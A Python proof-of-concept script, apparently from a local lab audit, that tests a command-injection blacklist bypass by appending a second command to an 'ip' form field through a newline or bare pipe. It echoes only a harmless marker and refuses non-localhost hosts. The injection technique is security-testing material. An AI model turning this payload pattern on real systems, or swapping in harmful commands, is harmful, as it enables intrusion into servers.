#!/usr/bin/env python3
"""CMD-003 benign local-lab PoC draft: blacklist bypass via LF or bare pipe.

Only echoes a harmless marker. Intended for localhost/127.0.0.1/::1 only.
"""
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(req.full_url, code, "redirect blocked: " + newurl, headers, fp)


def checked_url(raw):
    parts = urllib.parse.urlsplit(raw)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("URL scheme must be http or https")
    if not parts.hostname or parts.hostname.lower() not in ALLOWED_HOSTS:
        raise SystemExit("URL host must be localhost, 127.0.0.1 or ::1")
    if parts.username or parts.password:
        raise SystemExit("credentials in URL are not allowed")
    return raw


def read_cookie(path):
    with open(path, "r", encoding="utf-8") as handle:
        for line in handle:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if line.lower().startswith("cookie:"):
                return line.split(":", 1)[1].strip()
            return line
    raise SystemExit("no cookie value found in " + path)


def payload_for(os_name, marker):
    if os_name == "windows":
        return "127.0.0.1|echo " + marker
    return "127.0.0.1\necho " + marker


def post(url, cookie, ip_value, timeout):
    body = urllib.parse.urlencode({"Submit": "Submit", "ip": ip_value}).encode("utf-8")
    request = urllib.request.Request(url, data=body, method="POST")
    request.add_header("Content-Type", "application/x-www-form-urlencoded")
    request.add_header("Cookie", cookie)
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(request, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, body
    except urllib.error.URLError as exc:
        return None, "connection error: " + str(exc.reason)


def main():
    parser = argparse.ArgumentParser(description="CMD-003 local benign command-injection PoC draft")
    parser.add_argument("--url", required=True, help="full URL of the local audit page")
    parser.add_argument("--cookie-file", required=True, help="file holding the Cookie header value")
    parser.add_argument("--os", required=True, choices=("linux", "windows"), help="target OS branch")
    parser.add_argument("--marker", default="CMD003_MARKER", help="harmless echo marker")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()

    post_url = checked_url(args.url)
    cookie = read_cookie(args.cookie_file)
    marker = args.marker

    baseline_status, baseline_body = post(post_url, cookie, "127.0.0.1", args.timeout)
    print("baseline status:", baseline_status)
    print("baseline marker present:", marker in baseline_body)

    test_value = payload_for(args.os, marker)
    print("test ip value:", repr(test_value))
    test_status, test_body = post(post_url, cookie, test_value, args.timeout)
    print("test status:", test_status)
    print("test marker present:", marker in test_body)


if __name__ == "__main__":
    sys.exit(main())
